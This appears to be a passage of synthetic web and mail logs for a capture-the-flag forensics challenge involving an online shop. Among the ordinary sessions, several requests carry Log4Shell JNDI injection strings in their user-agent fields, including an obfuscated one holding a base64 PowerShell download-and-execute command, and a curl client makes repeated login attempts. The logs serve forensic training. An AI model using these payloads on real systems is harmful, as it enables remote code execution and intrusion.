+    "origin": "106.68.62.50",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "downunderctf.com",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.36.7 (KHTML, like Gecko) Version/5.0.2 Safari/532.36.7",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:21:29.000+0000",
+    "origin": "106.68.62.50",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.36.7 (KHTML, like Gecko) Version/5.0.2 Safari/532.36.7",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:52.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "admin@shop.downunderctf.com",
+    "direction": "Incoming",
+    "outcome": "Delivered",
+    "subject": "Your shop.downunderctf.com Password Has Been Changed",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:39:22.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:39:23.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:21:34.000+0000",
+    "origin": "106.68.62.50",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.36.7 (KHTML, like Gecko) Version/5.0.2 Safari/532.36.7",
+    "url": "shop.downunderctf.com/product?id=4",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:21:55.000+0000",
+    "origin": "106.68.62.50",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=4",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.36.7 (KHTML, like Gecko) Version/5.0.2 Safari/532.36.7",
+    "url": "shop.downunderctf.com/product?id=4",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:22:06.000+0000",
+    "origin": "106.68.62.50",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=4",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.36.7 (KHTML, like Gecko) Version/5.0.2 Safari/532.36.7",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:22:19.000+0000",
+    "origin": "106.68.62.50",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.36.7 (KHTML, like Gecko) Version/5.0.2 Safari/532.36.7",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:22:38.000+0000",
+    "origin": "106.68.62.50",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.36.7 (KHTML, like Gecko) Version/5.0.2 Safari/532.36.7",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:22:42.000+0000",
+    "origin": "106.68.62.50",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.36.7 (KHTML, like Gecko) Version/5.0.2 Safari/532.36.7",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:22:53.000+0000",
+    "origin": "106.68.62.50",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.36.7 (KHTML, like Gecko) Version/5.0.2 Safari/532.36.7",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:23:01.000+0000",
+    "origin": "106.68.62.50",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.36.7 (KHTML, like Gecko) Version/5.0.2 Safari/532.36.7",
+    "url": "shop.downunderctf.com/orderconfirm",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:19:42.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=9",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:20:56.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=7",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=7",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:21:29.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=1",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:21:44.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=1",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:06:29.000+0000",
+    "origin": "125.168.15.92",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:06:33.000+0000",
+    "origin": "125.168.15.92",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com/orderconfirm",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:05:12.000+0000",
+    "origin": "203.35.133.169",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "ads.facebook.com",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:05:20.000+0000",
+    "origin": "203.35.133.169",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:05:39.000+0000",
+    "origin": "203.35.133.169",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com/product?id=2",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:05:42.000+0000",
+    "origin": "203.35.133.169",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com/product?id=3",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:06:47.000+0000",
+    "origin": "203.35.133.169",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=3",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com/product?id=7",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:22:01.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:22:21.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:22:23.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:22:47.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:22:48.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/orderconfirm",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:22:50.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/orderconfirm",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:22:57.000+0000",
+    "origin": "106.69.37.132",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:45:53.000+0000",
+    "origin": "60.226.22.104",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "au.search.yahoo.com/search?p=downunderctf%20store",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:46:13.000+0000",
+    "origin": "60.226.22.104",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:46:16.000+0000",
+    "origin": "60.226.22.104",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:46:36.000+0000",
+    "origin": "60.226.22.104",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=1",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
+    "url": "shop.downunderctf.com/product?id=6",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:46:44.000+0000",
+    "origin": "60.226.22.104",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=6", 
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
+    "url": "shop.downunderctf.com/product?id=5",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:12.000+0000",
+    "origin": "185.254.123.33",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "${jndi:ldap://127.0.0.1:2864/a}",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:12.000+0000",
+    "origin": "185.254.123.33",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "${jndi:ldap://127.0.0.1:2864/a}",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:12.000+0000",
+    "origin": "185.254.123.33",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "${jndi:ldap://127.0.0.1:2864/a}",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:12.000+0000",
+    "origin": "185.254.123.33",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browser",
+    "useragent": "${jndi:ldap://127.0.0.1:2864/a}",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:12.000+0000",
+    "origin": "185.254.123.33",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=1",
+    "useragent": "${jndi:ldap://127.0.0.1:2864/a}",
+    "url": "shop.downunderctf.com/product?id=2",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:12.000+0000",
+    "origin": "185.254.123.33",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=2",
+    "useragent": "${jndi:ldap://127.0.0.1:2864/a}",
+    "url": "shop.downunderctf.com/product?id=3",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:13.000+0000",
+    "origin": "185.254.123.33",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "${jndi:ldap://127.0.0.1:2864/a}",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:13.000+0000",
+    "origin": "185.254.123.33",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "${jndi:ldap://127.0.0.1:2864/a}",
+    "url": "shop.downunderctf.com/Login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:22.000+0000",
+    "origin": "121.208.54.156",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "${jndi:ldap://127.0.0.1:2864/a}",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:45.000+0000",
+    "origin": "51.83.253.131",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "${jndi:dns://188.126.89.151:2864:2053/pixel.gif}",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:46.000+0000",
+    "origin": "51.83.253.131",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "${jndi:dns://188.126.89.151:2864:2053/pixel.gif}",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:47.000+0000",
+    "origin": "51.83.253.131",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browser",
+    "useragent": "${jndi:dns://188.126.89.151:2864:2053/pixel.gif}",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:48.000+0000",
+    "origin": "51.83.253.131",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=1",
+    "useragent": "${jndi:dns://188.126.89.151:2864:2053/pixel.gif}",
+    "url": "shop.downunderctf.com/product?id=2",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:49.000+0000",
+    "origin": "51.83.253.131",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=2",
+    "useragent": "${jndi:dns://188.126.89.151:2864:2053/pixel.gif}",
+    "url": "shop.downunderctf.com/product?id=3",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:50.000+0000",
+    "origin": "51.83.253.131",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "${jndi:dns://188.126.89.151:2864:2053/pixel.gif}",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:51.000+0000",
+    "origin": "51.83.253.131",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "${jndi:dns://188.126.89.151:2864:2053/pixel.gif}",
+    "url": "shop.downunderctf.com/Login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:42:52.000+0000",
+    "origin": "144.48.37.43",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browser",
+    "useragent": "${jndi:ldap://114:115.235.249/load}",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:42:53.000+0000",
+    "origin": "144.48.37.43",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=1",
+    "useragent": "${jndi:ldap://114:115.235.249/load}",
+    "url": "shop.downunderctf.com/product?id=2",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:42:54.000+0000",
+    "origin": "144.48.37.43",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=2",
+    "useragent": "${jndi:ldap://114:115.235.249/load}",
+    "url": "shop.downunderctf.com/product?id=3",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:42:55.000+0000",
+    "origin": "144.48.37.43",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "${jndi:ldap://114:115.235.249/load}",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:42:56.000+0000",
+    "origin": "144.48.37.43",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "${jndi:ldap://114:115.235.249/load}",
+    "url": "shop.downunderctf.com/Login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:00:08.000+0000",
+    "origin": "49.195.100.119",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:00:15.000+0000",
+    "origin": "49.195.100.119",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:00:44.000+0000",
+    "origin": "49.195.100.119",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:02:12.000+0000",
+    "origin": "125.168.15.92",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "ads.facebook.com",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:02:20.000+0000",
+    "origin": "125.168.15.92",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:29:13.000+0000",
+    "origin": "119.17.132.75",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://41.108.181.141:5552/Basic/Command/Base64/cG93ZXJzaGVsbC5leGUgLWV4ZWMgYnlwYXNzIC1DICJJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vZG93bnVuZGVyY3RmLmNvbS9wVENOcDVwNkxQMGQ3cUE3N3l2YjRTSGY0MCcpOyI=}",
+    "url": "shop.downunderctf.com/Login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:19.000+0000",
+    "origin": "101.164.158.121",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "downunderctf.com",
+    "useragent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/5331 (KHTML, like Gecko) Chrome/37.0.857.0 Mobile Safari/5331",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:41.000+0000",
+    "origin": "101.164.158.121",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/5331 (KHTML, like Gecko) Chrome/37.0.857.0 Mobile Safari/5331",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:10.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:11.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:11.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:55.000+0000",
+    "origin": "101.164.158.121",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/5331 (KHTML, like Gecko) Chrome/37.0.857.0 Mobile Safari/5331",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:55.000+0000",
+    "origin": "101.164.158.121",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/5331 (KHTML, like Gecko) Chrome/37.0.857.0 Mobile Safari/5331",
+    "url": "shop.downunderctf.com/product?id=2",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:56.000+0000",
+    "origin": "101.164.158.121",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/5331 (KHTML, like Gecko) Chrome/37.0.857.0 Mobile Safari/5331",
+    "url": "shop.downunderctf.com/product?id=3",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:56.000+0000",
+    "origin": "101.164.158.121",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/5331 (KHTML, like Gecko) Chrome/37.0.857.0 Mobile Safari/5331",
+    "url": "shop.downunderctf.com/product?id=4",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:56.000+0000",
+    "origin": "101.164.158.121",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/5331 (KHTML, like Gecko) Chrome/37.0.857.0 Mobile Safari/5331",
+    "url": "shop.downunderctf.com/product?id=5",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:57.000+0000",
+    "origin": "101.164.158.121",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/5331 (KHTML, like Gecko) Chrome/37.0.857.0 Mobile Safari/5331",
+    "url": "shop.downunderctf.com/product?id=6",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:57.000+0000",
+    "origin": "101.164.158.121",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/5331 (KHTML, like Gecko) Chrome/37.0.857.0 Mobile Safari/5331",
+    "url": "shop.downunderctf.com/product?id=7",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:57.000+0000",
+    "origin": "101.164.158.121",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/5331 (KHTML, like Gecko) Chrome/37.0.857.0 Mobile Safari/5331",
+    "url": "shop.downunderctf.com/product?id=8",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:58.000+0000",
+    "origin": "101.164.158.121",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/5331 (KHTML, like Gecko) Chrome/37.0.857.0 Mobile Safari/5331",
+    "url": "shop.downunderctf.com/product?id=9",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:22:47.000+0000",
+    "origin": "101.162.218.76",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "downunderctf.com",
+    "useragent": "Opera/9.12 (X11; Linux x86_64; sl-SI) Presto/2.9.351 Version/10.00",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:22:55.000+0000",
+    "origin": "101.162.218.76",
